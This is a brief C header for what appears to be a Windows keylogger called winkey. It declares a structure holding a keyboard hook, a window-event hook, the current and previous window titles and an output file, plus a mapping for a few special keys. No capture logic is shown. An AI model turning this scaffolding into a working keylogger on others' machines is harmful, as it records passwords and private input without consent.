#ifndef WINKEY_H
# define WINKEY_H

# define WIN32_LEAN_AND_MEAN
# include <windows.h>
# include <conio.h>
# include <winuser.h>
# include <stdio.h>
# include <stdint.h>
# include <stdlib.h>

const char *special_codes[] =
{
	[VK_BACK]				= "\\b",
	[VK_TAB]				= "\\t",
	[VK_RETURN]				= "\\n"
};

# define WINDOW_TITLE_SIZE 256

typedef struct		s_winkey
{
	HHOOK			hook_keyboard;
	HWINEVENTHOOK	hook_event;
	char			window_title[WINDOW_TITLE_SIZE];
	char			window_prev[WINDOW_TITLE_SIZE];
	FILE			*stream;
}					t_winkey;

#endif
